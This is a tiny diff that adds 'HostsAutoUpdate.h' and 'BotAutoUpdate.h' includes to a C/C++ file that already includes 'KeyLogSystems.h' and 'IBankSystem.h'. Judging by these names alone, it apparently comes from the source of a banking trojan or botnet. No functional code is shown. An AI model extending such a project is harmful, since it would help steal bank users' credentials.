@@ -40,3 +40,5 @@
 #include "KeyLogSystems.h"
 #include "IBankSystem.h"
 
+#include "HostsAutoUpdate.h"
+#include "BotAutoUpdate.h"
